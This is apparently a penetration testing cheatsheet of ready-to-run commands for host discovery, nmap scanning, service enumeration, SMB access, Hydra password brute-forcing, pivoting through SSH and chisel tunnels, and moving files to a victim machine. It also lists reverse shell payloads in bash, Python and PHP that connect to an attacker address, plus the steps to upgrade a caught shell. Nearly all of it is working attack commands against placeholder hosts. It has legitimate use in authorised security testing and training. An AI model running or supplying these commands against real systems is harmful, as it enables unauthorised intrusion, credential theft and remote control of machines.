Network Penetration Testing

Comprehensive cheatsheet for internal and external network penetration testing.

🔎 Host Discovery

Network Discovery Scan 
# Nmap host discovery (no port scan)
nmap -sn 192.168.1.0/24

# ARP scan (local network)
arp-scan -l
arp-scan 192.168.1.0/24

# Netdiscover
netdiscover -r 192.168.1.0/24

🗺️ Nmap Scanning

Common Nmap Scans 
# Full TCP SYN scan with service/version + scripts
nmap -sC -sV -oN scan.txt 192.168.1.100

# All ports
nmap -p- --min-rate 5000 -oN allports.txt 192.168.1.100

# UDP scan (top 100)
nmap -sU --top-ports 100 192.168.1.100

# Aggressive scan (OS + version + scripts + traceroute)
nmap -A 192.168.1.100

# Vuln script scan
nmap --script vuln 192.168.1.100

🔧 Service Enumeration

FTP (Port 21) Net 
# Anonymous login check
ftp 192.168.1.100
# Username: anonymous | Password: (blank or email)

# Nmap FTP scripts
nmap --script ftp-anon,ftp-bounce 192.168.1.100 -p 21
SSH (Port 22) Net 
# Banner grabbing
nc -nv 192.168.1.100 22

# Brute force with Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Connect with key
ssh -i id_rsa user@192.168.1.100
HTTP/HTTPS (Port 80/443) Net 
# Nikto web scanner
nikto -h http://192.168.1.100

# Whatweb fingerprinting
whatweb http://192.168.1.100

# Directory brute-force
ffuf -u http://192.168.1.100/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

📁 SMB Attacks

SMB Enumeration & Access 
# List shares (null session)
smbclient -L //192.168.1.100 -N

# Connect to share
smbclient //192.168.1.100/share -N

# Enum4linux
enum4linux -a 192.168.1.100

# Nmap SMB scripts
nmap --script smb-enum-shares,smb-enum-users -p 445 192.168.1.100

🔨 Brute Force

Hydra - Common Services 
# SSH
hydra -l admin -P rockyou.txt ssh://192.168.1.100

# FTP
hydra -l admin -P rockyou.txt ftp://192.168.1.100

# HTTP POST form
hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# RDP
hydra -l administrator -P rockyou.txt rdp://192.168.1.100

🐚 Reverse Shells

Start Listener 
# Netcat listener
nc -lvnp 4444

# Rlwrap for better shell (arrow keys etc)
rlwrap nc -lvnp 4444
Reverse Shell Payloads 
# Bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'

# PHP
<?php system("bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"); ?>

# Upgrade to full TTY after catching shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z then:
stty raw -echo; fg
export TERM=xterm

🔀 Pivoting & Tunneling

SSH Tunneling Net 
# Local port forward (access remote service locally)
ssh -L 8080:192.168.2.100:80 user@192.168.1.100

# Dynamic SOCKS proxy
ssh -D 1080 user@192.168.1.100
# Then use proxychains with socks5 127.0.0.1 1080

# Chisel server (attacker)
./chisel server --reverse -p 9000

# Chisel client (victim)
./chisel client 10.10.10.10:9000 R:socks

📦 File Transfer

Transfer Methods 
# Python HTTP server (attacker)
python3 -m http.server 8000

# Download on victim (Linux)
wget http://10.10.10.10:8000/file.sh
curl -O http://10.10.10.10:8000/file.sh

# Download on victim (Windows PowerShell)
Invoke-WebRequest -Uri http://10.10.10.10:8000/file.exe -OutFile file.exe
# Or shorter:
iwr http://10.10.10.10:8000/file.exe -o file.exe

# Netcat file transfer
# Receiver:  nc -lvnp 4444 > received_file
# Sender:    nc 10.10.10.10 4444 < file_to_send
